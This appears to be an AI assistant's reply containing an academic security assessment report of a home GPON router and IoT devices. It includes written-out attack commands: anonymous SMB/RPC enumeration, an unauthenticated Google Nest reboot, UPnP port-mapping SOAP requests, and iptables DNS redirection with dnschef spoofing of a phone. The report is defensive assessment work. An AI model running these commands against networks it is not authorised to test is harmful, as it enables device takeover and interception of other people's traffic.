Aqui está o **relatório final reescrito em inglês**, já atualizado com tudo o que descobriste hoje (P100, UPnP, SNMP, captures, falsos positivos, etc.) e mantendo o teu template base 👇

---

# 📡 GPON Router & IoT Network — Security Assessment Report

> Internal Network Penetration Test / IoT & Router Security Assessment

**Report ID:** R-2026-002
**Issue Date:** 25/04/2026
**Version:** 2.0
**Author(s):** [Your Name]
**Programme:** Cybersecurity Academic Project

---

# 1. Introduction

## 1.1 Client Context

**Assessed environment:**

A home network composed of:

* GPON Router (192.168.1.254) — ISP device (MEO)
* IoT devices:

  * Google Nest Mini (192.168.1.146)
  * Wi-Fi extender / AP (192.168.1.228)
  * Smart bulb (192.168.1.83)
  * TP-Link Smart Plug P100 (192.168.1.117)
  * Home Assistant instance (192.168.1.222)

**Technologies identified:**

* Embedded Linux (Yocto / RDK-based firmware)
* Samba (SMBv1)
* Telnet
* UPnP (Internet Gateway Device)
* IoT APIs (Google Cast, proprietary APIs)

---

## 1.2 Assessment Objective

* Identify exposed services in the internal network
* Assess IoT device security posture
* Test authentication mechanisms
* Evaluate exploitation feasibility from a LAN attacker

---

## 1.3 Scope

**Assessment model:** Internal attacker (LAN access)
**Date:** 24–25 April 2026

---

# 2. Methodology

## 2.1 Initial Network Discovery

Initial device enumeration:

```bash
nmap -sn 192.168.1.0/24
```

Result:

* 12 active hosts discovered
* Includes router, IoT devices, smartphones, and servers

Additionally, device discovery was validated using Fing (Android).

---

## 2.2 Full Network Scan

```bash
nmap -sV --script "default,safe,vuln" 192.168.1.0/24 > resultados.txt 2>&1
```

This allowed:

* Service identification
* Vulnerability script execution
* Discovery of UPnP and HTTP anomalies

---

# 3. Attack Surface Overview

## 3.1 Router — 192.168.1.254

### Open Services

| Port    | Service | Notes       |
| ------- | ------- | ----------- |
| 22      | SSH     | Dropbear    |
| 23      | Telnet  | ⚠️ insecure |
| 53      | DNS     | dnsmasq     |
| 80      | HTTP    | admin       |
| 443     | HTTPS   | self-signed |
| 139/445 | SMB     | Samba       |
| 49152+  | UPnP    | exposed     |

---

## 3.2 Smart Plug (P100) — 192.168.1.117

| Port   | Service | Notes           |
| ------ | ------- | --------------- |
| 80     | HTTP    | Minimal service |
| others | closed  |                 |

---

# 4. Technical Findings

---

## 4.1 SMBv1 Enabled (Router)

### Evidence

```bash
nmap -p445 --script smb-protocols 192.168.1.254
```

Result:

```
NT LM 0.12 (SMBv1)
```

### Impact

* Legacy protocol
* Vulnerable to known exploits
* Weak security model

---

## 4.2 Anonymous SMB / RPC Access

### Evidence

```bash
rpcclient -U "" -N 192.168.1.254 --option='client min protocol=NT1'
```

```bash
netshareenum
```

Result:

```
storage → C:\tmp\media
```

### Impact

* Information disclosure
* Internal filesystem exposure

---

## 4.3 Telnet Service Exposed

### Evidence

```text
GEN8 login:
```

### Impact

* Plaintext authentication
* Potential default credentials
* High compromise risk

---

## 4.4 UPnP Internet Gateway Device Exposed

### Evidence

UPnP device description:

```xml
deviceType: InternetGatewayDevice:1
controlURL: /upnp/control/WANIPConnection0
```

Accessible endpoint:

```
http://192.168.1.254:49153/
```

### Impact

* Potential port forwarding abuse
* Internal malware can expose services externally
* Increased attack surface

---

## 4.5 Google Nest — Unauthenticated API

### Evidence

```bash
curl http://192.168.1.146:8008/setup/eureka_info
```

### Data exposed

* Device info
* Network info
* Firmware

### Impact

* Information disclosure
* Reconnaissance

---

## 4.6 Google Nest — Control Without Authentication

### Evidence

```bash
curl -X POST http://192.168.1.146:8008/setup/reboot
```

### Impact

* Remote control of device
* DoS potential

---

## 4.7 Wi-Fi Extender API Exposure

### Evidence

```bash
curl "http://192.168.1.228/protocol.csp?fname=net&opt=ap_list&function=get"
```

### Impact

* Wi-Fi network enumeration
* Configuration leakage

---

## 4.8 SNMP Exposure (Filtered)

### Evidence

```bash
sudo nmap -sU -p161 192.168.1.254
```

```bash
snmpwalk -v2c -c public 192.168.1.254
```

Result:

```
Timeout
```

### Additional testing

```bash
onesixtyone ...
```

→ No valid community strings found

### Interpretation

* SNMP port exposed but restricted
* Still increases attack surface

---

## 4.9 TP-Link P100 — False Positive (phpMyAdmin)

### Summary

Initial scan flagged phpMyAdmin/path traversal.

### Verification

```bash
curl -i http://192.168.1.117/
```

Result:

```html
<html><body><center>200 OK</center></body></html>
```

### Conclusion

* Static response for all requests
* No PHP, no filesystem access

### Status

**False Positive**

---

## 4.10 TP-Link P100 — Local Attack Surface

### Observations

```bash
nmap -p- 192.168.1.117
```

Result:

```
80/tcp open
```

Other ports:

```
9999 closed
20002 closed
50443 closed
```

### Traffic Analysis

```bash
tcpdump host 192.168.1.117
```

Result:

```
0 packets captured
```

### Interpretation

* No visible LAN communication
* Likely cloud-controlled
* Encrypted or proprietary protocol

---

# 5. Commands Used

## Discovery

```bash
nmap -sn 192.168.1.0/24
```

---

## Full Scan

```bash
nmap -sV --script "default,safe,vuln" 192.168.1.0/24 > resultados.txt 2>&1
```

---

## SMB

```bash
nmap -p445 --script smb-protocols 192.168.1.254
smbclient -L //192.168.1.254 -N --option='client min protocol=NT1'
rpcclient -U "" -N 192.168.1.254 --option='client min protocol=NT1'
```

---

## SNMP

```bash
sudo nmap -sU -p161 192.168.1.254
snmpwalk -v2c -c public 192.168.1.254
onesixtyone ...
```

---

## IoT Testing

```bash
curl http://192.168.1.146:8008/setup/eureka_info
curl -X POST http://192.168.1.146:8008/setup/reboot
```

---

## Smart Plug

```bash
curl http://192.168.1.117/
echo '{"system":{"get_sysinfo":{}}}' | nc 192.168.1.117 9999
```

---

# 6. Risk Summary

| Severity | Findings                   |
| -------- | -------------------------- |
| High     | Telnet, SMBv1, IoT control |
| Medium   | UPnP, API exposure         |
| Low      | HTTP minimal services      |

---

# 7. Recommendations

| Issue    | Action              |
| -------- | ------------------- |
| SMBv1    | Disable             |
| Telnet   | Disable             |
| UPnP     | Disable or restrict |
| IoT APIs | Add authentication  |
| Network  | Segment IoT         |

---

# 8. Conclusion

The network presents multiple weaknesses:

* Legacy protocols still active
* IoT devices lacking authentication
* Excessive trust within LAN

An attacker inside the network could:

* Enumerate devices
* Extract sensitive data
* Control IoT devices
* Abuse router services

---------------------------------------------------------final assesment on the router

---

# 7. Technical Findings

---

## 7.1 UPnP WANIPConnection Exposed with Improper State Enforcement

---

### 7.1.1 Finding Summary

The router exposes an unauthenticated UPnP Internet Gateway Device (IGD) service that accepts SOAP requests to manipulate WAN configuration (e.g., port forwarding). Although the service responds with successful operations, the requested changes are not actually applied, indicating improper validation and inconsistent internal state handling.

---

### 7.1.2 Risk Classification

| Metric        | Value                               |
| ------------- | ----------------------------------- |
| Risk Category | Medium                              |
| CVSS v3.x     | 5.3                                 |
| CVSS Vector   | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N |

**Classification rationale:**
The service is exposed internally without authentication and allows interaction with WAN control functions. Although exploitation does not result in direct port exposure, the inconsistent behavior and lack of validation indicate weak control-plane security.

---

### 7.1.3 Background

UPnP (Universal Plug and Play) Internet Gateway Device (IGD) services allow internal devices to request actions such as port forwarding and WAN configuration. These services are often unauthenticated and rely on network trust, making them a common target in IoT and router exploitation scenarios.

Improper implementations may:

* Accept requests without enforcing them
* Return misleading success responses
* Expose internal control logic

---

### 7.1.4 Evidence / Technical Details

**Affected asset:**

* Router: `192.168.1.254`
* Service: UPnP IGD (`WANIPConnection`)
* Port: `49153/tcp`

---

## Step-by-Step Reproduction

---

### Step 1 — Identify UPnP Service

Retrieve device description:

```bash
curl http://192.168.1.254:49153/IGDdevicedesc_brlan0.xml
```

**Relevant output:**

```xml
<deviceType>urn:schemas-upnp-org:device:InternetGatewayDevice:1</deviceType>
<modelName>GEN8</modelName>

<controlURL>/upnp/control/WANIPConnection0</controlURL>
```

---

### Step 2 — Attempt Port Mapping via UPnP

```bash
curl -X POST http://192.168.1.254:49153/upnp/control/WANIPConnection0 \
-H "Content-Type: text/xml" \
-H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" \
-d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>5555</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>22</NewInternalPort>
<NewInternalClient>192.168.1.200</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>test</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>'
```

**Observed response:**

```xml
<u:AddPortMappingResponse>
```

👉 Indicates success (no authentication required)

---

### Step 3 — Validate Mapping Existence

Enumerate mappings:

```bash
for i in {0..10}; do
  echo "Index $i"
  curl -s -X POST http://192.168.1.254:49153/upnp/control/WANIPConnection0 \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry\"" \
  -d "<?xml version=\"1.0\"?>
<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">
<s:Body>
<u:GetGenericPortMappingEntry xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">
<NewPortMappingIndex>$i</NewPortMappingIndex>
</u:GetGenericPortMappingEntry>
</s:Body>
</s:Envelope>"
  echo -e "\n----------------------"
done
```

**Observed response:**

```xml
errorCode: 713
errorDescription: SpecifiedArrayIndexInvalid
```

👉 No mappings exist

---

### Step 4 — Attempt to Delete Mapping

```bash
curl -X POST http://192.168.1.254:49153/upnp/control/WANIPConnection0 \
-H "Content-Type: text/xml" \
-H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping\"" \
-d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<u:DeletePortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>80</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
</u:DeletePortMapping>
</s:Body>
</s:Envelope>'
```

**Observed response:**

```xml
errorCode: 714
errorDescription: NoSuchEntryInArray
```

👉 Confirms no mapping exists

---

### Step 5 — Retrieve External IP via UPnP

```bash
curl -X POST http://192.168.1.254:49153/upnp/control/WANIPConnection0 \
-H "Content-Type: text/xml" \
-H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress\"" \
-d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"/>
</s:Body>
</s:Envelope>'
```

**Observed response:**

```xml
<NewExternalIPAddress>up</NewExternalIPAddress>
```

👉 Invalid response (should return a real IP)

---

### Step 6 — Validate Local Service (SSH)

```bash
sudo ss -tuln | grep 22
```

**Observed:**

```text
tcp LISTEN 0.0.0.0:22
```

👉 Internal service available for forwarding

---

### Step 7 — Test Port Forwarding (Internal)

```bash
nc -v 192.168.1.254 5555
```

**Result:**

```
Connection refused
```

---

### Step 8 — Test Port Forwarding (External)

```bash
nc -v 2.81.249.112 5555
```

**Result:**

```
Connection refused
```

---

## Summary of Behavior

| Action          | Result        |
| --------------- | ------------- |
| AddPortMapping  | ✅ Accepted    |
| GetMapping      | ❌ Not found   |
| DeleteMapping   | ❌ Not found   |
| External Access | ❌ Not working |

---

### 7.1.5 Impact Analysis

Although the router does not apply the requested port mappings, the UPnP service:

* Accepts unauthenticated control requests
* Provides misleading success responses
* Exposes WAN configuration functionality internally

Potential impact includes:

* Misleading client behavior (false assumptions of successful configuration)
* Increased attack surface for internal threats
* Potential for further exploitation if additional flaws exist

---

### 7.1.6 Exploitability / Likelihood Analysis

* No authentication required
* Accessible from internal network
* Simple SOAP requests
* No rate limiting observed

However:

* Actions are not enforced
* No direct external exposure achieved

---

### 7.1.7 Recommendation

**Primary recommendation:**

* Disable UPnP if not required

**Additional recommendations:**

* Restrict UPnP access to trusted devices only
* Ensure proper validation and enforcement of SOAP actions
* Return accurate responses reflecting actual state

---

### 7.1.8 References

1. UPnP Device Architecture
2. OWASP IoT Top 10
3. Common UPnP Security Issues

---

### 7.1.9 Retest Notes

Retesting should confirm:

* UPnP service is disabled or restricted
* Port mappings are either:

  * correctly enforced, or
  * properly rejected
* SOAP responses reflect actual state changes

---






# MITM 


---

# 4.11 DNS Traffic Analysis & Sniffing (IoT Behaviour)

---

## 4.11.1 Objective

Analyze DNS traffic generated by IoT devices to:

* Identify external communications
* Detect potential suspicious domains
* Understand device behaviour (cloud dependency)

---

## 4.11.2 Passive DNS Capture

### Method

Both the analyst machine and target device were connected to the same LAN.

DNS traffic was captured using:

```bash
sudo tcpdump -i wlo1 -nn port 53
```

Captured traffic was saved and filtered for analysis.

---

## 4.11.3 Extracting DNS Queries

### Extract IP and Ports

```bash
grep -E '([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}): ([0-9]{1,5})' filterd.txt
```

### Extract Destination Ports

```bash
grep -E '([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}): ([0-9]{1,5})' filterd.txt | awk -F: '{ print $2 }'
```

---

### Extract Queried Domains

```bash
grep -oE '(A\?|AAAA\?) ([^ ]+)' filterd.txt | awk '{print $2}' \
| sort | uniq -c | sort -nr
```

### Results

```
38 a1-us.iotbing.com.
16 log.tailscale.com.
16 controlplane.tailscale.com.
3  www.google.com.
3  connectivitycheck.gstatic.com.
2  play.googleapis.com.
```

---

## 4.11.4 DNS Redirection Setup (Man-in-the-Middle Preparation)

### Network Mapping

| Device   | IP            |
| -------- | ------------- |
| Attacker | 192.168.1.200 |
| iPhone   | 192.168.1.251 |

---

### DNS Redirection via iptables

```bash
sudo iptables -t nat -A PREROUTING -s 192.168.1.251 -p udp --dport 53 -j DNAT --to-destination 192.168.1.200:53
sudo iptables -t nat -A PREROUTING -s 192.168.1.251 -p tcp --dport 53 -j DNAT --to-destination 192.168.1.200:53
```

---

## 4.11.5 DNS Spoofing Attempt (dnschef)

```bash
sudo python3 dnschef.py \
  --interface 192.168.1.200 \
  --fakeip 192.168.1.200 \
  --fakedomains tplinkcloud.com,connectivitycheck.gstatic.com \
  --logfile dnschef.log
```

### Observed Behaviour

* Target application crashed when DNS responses were manipulated
* Indicates dependency on valid cloud endpoints
* Suggests basic integrity validation or strict backend requirements

---

## 4.11.6 Passive DNS Sniffing (No Manipulation)

```bash
sudo python3 dnschef.py \
  --interface 192.168.1.200 \
  --nameservers 1.1.1.1 \
  --logfile dnschef.log
```

---

### Extracted Domains

```bash
grep -oE '(A\?|AAAA\?) ([^ ]+)' trafegoSniffado.txt | awk '{print $2}' \
| sort | uniq -c | sort -nr
```

### Results

```
24 dns.google.
18 nedissmartlife.applink.smart321.com.
18 gspe1-ssl.ls.apple.com.
16 m1.tuyaeu.com.
16 a1.tuyaeu.com.
14 configuration.ls.apple.com.
12 thing.miniapp.com.
12 37-courier.push.apple.com.
10 gsp64-ssl.ls.apple.com.
8  mask.icloud.com.
8  gateway.icloud.com.
3  ipv4only.arpa.
```

---

## 4.11.7 IoT Cloud Endpoints Identified

Observed domains related to IoT/cloud infrastructure:

* Tuya ecosystem:

  * a1.tuyaeu.com
  * m1.tuyaeu.com

* Smart platform:

  * nedissmartlife.applink.smart321.com
  * thing.miniapp.com

### Interpretation

* Strong cloud dependency
* No observable local control protocol
* Likely encrypted communication (TLS)

---

## 4.11.8 Domain Reputation Check

### connectivitycheck.gstatic.com

* Public Google endpoint used for connectivity testing

VirusTotal analysis:

* Classified as **legitimate**
* No malicious activity detected
* Widely used across devices

---

## 4.11.9 Key Findings

| Observation                           | Impact                      |
| ------------------------------------- | --------------------------- |
| High volume of external DNS queries   | Strong cloud reliance       |
| DNS spoofing breaks app functionality | No offline fallback         |
| Apple & Google endpoints present      | Normal mobile behaviour     |
| Tuya domains observed                 | IoT cloud backend confirmed |

---

## 4.11.10 Conclusion

DNS analysis revealed that:

* IoT devices rely heavily on external cloud infrastructure
* No meaningful local communication was observed
* DNS manipulation disrupts device/app functionality
* Traffic is likely encrypted, limiting inspection capabilities

---

## 4.11.11 Next Steps

Planned improvement:

* Redirect DNS to a controlled resolver (e.g., Pi-hole)
* Monitor full traffic patterns
* Attempt TLS inspection (if feasible)

---

Se quiser, posso também integrar isto diretamente no teu ficheiro `.md` e devolver já pronto 👍

